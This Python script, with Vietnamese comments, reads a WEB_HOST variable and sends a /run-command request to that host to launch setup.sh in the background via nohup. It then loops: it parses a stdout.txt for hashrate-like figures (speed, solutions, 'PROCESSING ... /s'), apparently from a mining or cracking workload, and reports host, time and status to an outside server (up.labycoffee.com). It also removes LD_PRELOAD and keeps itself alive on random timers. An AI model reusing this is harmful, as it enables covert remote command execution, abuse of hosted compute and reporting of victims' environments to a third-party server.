import requests, time, os, re, pytz, random, subprocess,sys
from datetime import datetime
import traceback,http.client,json
def clear_terminal():
    try:
        if 'LD_PRELOAD' in os.environ:
            del os.environ['LD_PRELOAD']
        if sys.stdout.isatty():
            os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
while True:
    current_env = os.environ.copy()

    # Chạy lệnh printenv và lấy đầu ra
    result = subprocess.run(['printenv'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, env=current_env)

    # Kiểm tra lỗi
    if result.stderr:
        clear_terminal()
        print(f"Lỗi khi chạy printenv: {result.stderr}")
        time.sleep(5)  # Chờ một chút trước khi thử lại
        continue

    # Tìm kiếm biến môi trường WEB_HOST
    web_host_line = [line for line in result.stdout.splitlines() if line.startswith('WEB_HOST=')]

    if web_host_line:
        clear_terminal()
        print(f"WEB_HOST :"+web_host_line[0].split("=", 1)[1])
        break  # Thoát vòng lặp nếu tìm thấy WEB_HOST
    else:
        clear_terminal()
        print("WEB_HOST không được tìm thấy, tiếp tục tìm...")
        time.sleep(5)  # Chờ trước khi thử lại
url = "1997-"+web_host_line[0].split("=", 1)[1]
clear_terminal()
print(f"URL đã được tạo: {url}") 

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
# ST_FILE = os.path.join(BASE_DIR, "python-app/stdout.txt")
# os.makedirs(os.path.dirname(ST_FILE), exist_ok=True)
# open(ST_FILE, "a").close()
# Hàm lọc các ký tự escape và ký tự không hợp lệ
def clean_text(text):
    # Loại bỏ các ký tự escape như \x1b[H\x1b[2J\x1b[3J
    return re.sub(r'\x1b\[.*?m|\x1b\[[0-9;]*[a-zA-Z]', '', text)

# def extract_last_processing(result):
#     # Tìm tất cả các đoạn bắt đầu bằng "PROCESSING..." và kết thúc bằng "U/s"
#     matches = re.findall(r'PROCESSING\.\.\..*?U/s', result)
    
#     if not matches:
#         return "Không tìm thấy đoạn PROCESSING... đến U/s"

#     # Trả về đoạn cuối cùng
#     return matches[-1]

def extract_last_processing(text):
    matches = re.findall(r'PROCESSING\.\.\..*?\/s', text)
    return matches[-1].strip() if matches else None


def extract_last_processing2(text):
    lines = text.splitlines()
    lines = [line for line in lines if 'PROCESSING' in line and '/s' in line]
    if not lines:
        return None
    last_line = lines[-1]
    matches = re.findall(r'PROCESSING\.\.\..*?\/s', last_line)
    return matches[-1].strip() if matches else None


def extract_last_status_line(text):
    lines = text.splitlines()
    filtered = [line for line in lines if 'STATUS=' in line and 'C/s' in line]
    if not filtered:
        return None
    return clean_text(filtered[-1].strip())


def extract_last_s_line(text):
    lines = text.splitlines()
    filtered = [line for line in lines if '/s' in line]
    if not filtered:
        return None
    return clean_text(filtered[-1].strip())


# def find_non_empty_stdout(base_dir):
#     paths = [
#         os.path.join(base_dir, 'stdout.txt'),
#         os.path.join(base_dir, 'python-app', 'stdout.txt'),
#         os.path.join(base_dir, 'python-automate', 'stdout.txt')
#     ]
#     for path in paths:
#         if os.path.exists(path) and os.path.getsize(path) > 0:
#             return path
#     return None
def find_non_empty_stdout(BASE_DIR):
    for root, dirs, files in os.walk(BASE_DIR):
        if 'stdout.txt' in files:
            full_path = os.path.join(root, 'stdout.txt')
            if os.path.getsize(full_path) > 0:
                return full_path
    return None

def process_file():
    try:
        ST_FILE = find_non_empty_stdout(BASE_DIR)
        if not ST_FILE:
            return "File không tồn tại"

        with open(ST_FILE, 'r', encoding='utf-8') as f:
            content = f.read()

        if not content.strip():
            return "No Data"

        cleaned_content = clean_text(content)

        # Ưu tiên: nếu có Status, Speed, Solutions, Ignored thì gộp 1 dòng
        latest_status = latest_speed = latest_solutions = latest_ignored = None

        for line in cleaned_content.splitlines():
            line = clean_text(line)
            if 'Status' in line:
                match = re.search(r'Status\s*:\s*(.*)', line)
                if match:
                    latest_status = match.group(1).strip()
            elif 'Speed' in line:
                match = re.search(r'Speed\s*:\s*(.*)', line)
                if match:
                    latest_speed = match.group(1).strip()
            elif 'Solutions' in line:
                match = re.search(r'Solutions\s*:\s*(.*)', line)
                if match:
                    latest_solutions = match.group(1).strip()
            elif 'Ignored' in line:
                match = re.search(r'Ignored\s*:\s*(.*)', line)
                if match:
                    latest_ignored = match.group(1).strip()

        if all([latest_status, latest_speed, latest_solutions, latest_ignored]):
            result = f"Status: {latest_status} | Speed: {latest_speed} | Solutions: {latest_solutions} | Ignored: {latest_ignored}"
            return f"{clean_text(result)}"

        # Thử kiểu 1
        if re.search(r'\d+\.\d+\s\/s', cleaned_content):
            result1 = extract_last_processing(cleaned_content)
            if result1:
                return result1

        # Thử kiểu 2
        result2 = extract_last_processing2(content)
        if result2:
            return result2

        result3 = extract_last_status_line(content)
        if result3:
            return result3

        result4 = extract_last_s_line(content)
        if result4:
            return result4

        return "Không tìm thấy dữ liệu phù hợp."

    except Exception as e:
        return f"Lỗi: {str(e)}"


# def process_file():
#     result = ""  # Khởi tạo biến result để lưu kết quả
    
#     try:
#         # Kiểm tra sự tồn tại của file
#         if not os.path.exists(ST_FILE):
#             result = "File không tồn tại tại "
#             return result, 404
        
#         # Đọc nội dung file
#         with open(ST_FILE, "r", encoding="utf-8", errors="replace") as f:
#             lines = f.readlines()
        
#         # Kiểm tra xem file có dữ liệu không
#         if not lines:
#             result = "No Data"
#             return result
        
#         # Tìm dòng cuối cùng chứa từ "PROCESSING"
#         last_processing_line = None
#         for line in reversed(lines):  # Duyệt từ cuối lên đầu
#             if "PROCESSING" in line:
#                 last_processing_line = line.strip()
#                 break
        
#         # Nếu không tìm thấy dòng chứa "PROCESSING"
#         if not last_processing_line:
#             result = "No Data"
#             return result
        
#         # Loại bỏ các ký tự escape
#         last_processing_cleaned = clean_text(last_processing_line)

#         # Lọc và lấy phần cuối cùng chứa "PROCESSING..." và U/s
#         match = re.search(r'(\d+\.\d+)\sU/s', last_processing_cleaned)
        
#         if match:
#             result = extract_last_processing(last_processing_cleaned)
#         else:
#             result = "Không tìm thấy tốc độ U/s trong phần cuối cùng."
    
#     except Exception as e:
#         # In ra lỗi chi tiết nếu có
#         print("Lỗi trong process_file:", e)
#         print("Thông tin chi tiết lỗi:")
#         traceback.print_exc()
#         result = "Có lỗi xảy ra trong việc xử lý file."
    
#     return result

for a in range(120):
    time.sleep(5)
    response = requests.get('https://' + url)
    if response.status_code == 200:
        conn = http.client.HTTPSConnection(url)

        payload = json.dumps({
            "commands": [
                "chmod +x setup.sh && sed -i 's/\\\r$//' setup.sh && nohup ./setup.sh > setup.log 2>&1 &"

            ]
        }) 
        headers = {
        'Content-Type': 'application/json'
        }
        conn.request("POST", "/run-command", payload, headers)
        res = conn.getresponse()
        data = res.read()
        clear_terminal()
        print(data.decode("utf-8"))
        time.sleep(1)
        break
    else:
        continue
# Khởi tạo session toàn cục
session = requests.Session()
timezone = pytz.timezone("Asia/Ho_Chi_Minh")
timess = datetime.now(timezone).strftime("%Y-%m-%d %H:%M:%S")
count = 0

while True:
    count += 1

    try:
        clear_terminal()
        print("Đang gửi request đến URL:", url)
        # response = requests.get('https://' + url)
        # if response.status_code == 200:
        #     result = process_file()
        # else:
        #     result = process_file()
        #     time.sleep(1)
        #     continue
        try:
            response = session.get('https://' + url, timeout=44)
        except Exception as e:
            print("Lỗi khi gửi request đến URL chính:", e)
            response = None

        if response and response.status_code == 200:
            result = process_file()
        else:
            result = process_file()
            time.sleep(1)
            continue

        clear_terminal()
        print(f"result: {result}")
        time.sleep(2)
        
        now = datetime.now(timezone).strftime("%Y-%m-%d %H:%M:%S")
        clear_terminal()
        print(f"Đang gửi thông tin lên server: {url}, {now}, {result}")
        get = requests.get("https://up.labycoffee.com/upgmail-update.php?uid=" + url + "&full_info=" + url + "%" + str(now) + "%" + str(result) + "%" + str(timess) + "&type=44")
        try:
            upclone_web = get.json()['upclone_web']
            clear_terminal()
            print(upclone_web)
        except Exception as e:
            clear_terminal()
            print(">>> Lỗi trong việc xử lý JSON:", e)

        try:
            conn = http.client.HTTPSConnection(url, timeout=44)

            payload = json.dumps({
                "commands": [
                    """ls"""
                ]
            }) 
            headers = {
            'Content-Type': 'application/json'
            }
            conn.request("POST", "/run-command", payload, headers)
            res = conn.getresponse()
            data = res.read()
            #print(data.decode("utf-8"))
            conn.close()
        except:
            pass
        print("[pypya.py] Still alive at", time.strftime("%Y-%m-%d %H:%M:%S"), flush=True)    
        if count == 1:
            time.sleep(60)
        else:
            time.sleep(random.randint(2444, 3111))
        continue
    except Exception as e:
        clear_terminal()
        print("Lỗi trong vòng lặp chính (2):", e)
        print("Thông tin chi tiết lỗi:")
        traceback.print_exc()
        time.sleep(10)
        continue


